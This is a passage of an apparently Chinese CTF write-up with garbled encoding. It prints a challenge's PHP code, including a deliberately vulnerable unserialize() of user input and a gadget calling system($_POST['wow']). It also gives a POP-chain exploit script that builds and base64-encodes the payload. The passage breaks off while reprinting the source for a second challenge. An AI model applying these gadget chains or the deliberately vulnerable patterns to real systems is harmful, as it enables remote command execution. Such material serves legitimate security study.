</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You studied hard yesterday.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">hard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">today</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$doing</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$did</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">did</span> <span class="o">=</span> <span class="s2">&#34;What you did makes you outstanding.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span> <span class="o">=</span> <span class="s2">&#34;And what you&#39;ve done has given you a choice.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">))</span><span class="o">==</span><span class="mi">666</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">-&gt;</span><span class="na">better</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">tommoraw</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$good</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$bad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$soso</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">good</span><span class="o">=</span><span class="s2">&#34;You&#39;ll be good tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">good</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bad</span><span class="o">=</span><span class="s2">&#34;You&#39;ll be bad tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">future</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$useful1</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful2</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful3</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful4</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful5</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful6</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful7</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful8</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful9</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful10</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful11</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful12</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful13</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful14</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful15</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful16</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful17</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful18</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful19</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">out</span><span class="o">-&gt;</span><span class="na">useful7</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;Seven is my lucky number&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;This is your future.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;wow&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;win&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span> <span class="o">=</span> <span class="s2">&#34;no&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Focus on the previous step!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unserialize</span><span class="p">(</span><span class="nx">best64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// You learn yesterday, you choose today, can you get to your future?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªé“¾å­å¾ˆæ˜¾ç„¶å•Š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">yesterday(__destruct)-&gt; today (__call) -&gt;future(__toString)
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åexpæ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">   <span class="k">class</span> <span class="nc">yesterday</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$learn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$try</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">learn</span> <span class="o">=</span> <span class="s2">&#34;learn&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You studied hard yesterday.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">hard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">     <span class="k">class</span> <span class="nc">today</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$doing</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$did</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">did</span> <span class="o">=</span> <span class="s2">&#34;What you did makes you outstanding.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span> <span class="o">=</span> <span class="s2">&#34;And what you&#39;ve done has given you a choice.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">))</span><span class="o">==</span><span class="mi">666</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">-&gt;</span><span class="na">better</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">future</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$useful1</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful2</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful3</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful4</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful5</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful6</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful7</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful8</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful9</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful10</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful11</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful12</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful13</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful14</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful15</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful16</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful17</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful18</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful19</span><span class="p">;</span><span class="k">public</span> <span class="nv">$useful20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">out</span><span class="o">-&gt;</span><span class="na">useful7</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;Seven is my lucky number&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;This is your future.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;wow&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;win&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span> <span class="o">=</span> <span class="s2">&#34;no&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">no</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">yesterday</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">=</span><span class="k">new</span> <span class="nx">today</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">=</span><span class="k">new</span> <span class="nx">future</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">))))))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250417200714267.png" alt="image-20250417200714267" style="zoom:50%;" />
<h3 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ å¤ä»‡"><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿï¼ˆå¤ä»‡ï¼‰</strong>
</h3><p>ä¾æ—§çœ‹class.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">best64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$str</span><span class="p">))));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">yesterday</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$learn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$try</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">learn</span> <span class="o">=</span> <span class="s2">&#34;learn&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;You studied hard yesterday.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">hard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">today</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$doing</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$did</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">did</span> <span class="o">=</span> <span class="s2">&#34;What you did makes you outstanding.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span> <span class="o">=</span> <span class="s2">&#34;And what you&#39;ve done has given you a choice.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">))</span><span class="o">==</span><span class="mi">666</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">-&gt;</span><span class="na">better</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">tommoraw</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$good</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$bad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$soso</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">good</span><span class="o">=</span><span class="s2">&#34;You&#39;ll be good tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">good</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bad</span><span class="o">=</span><span class="s2">&#34;You&#39;ll be bad tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
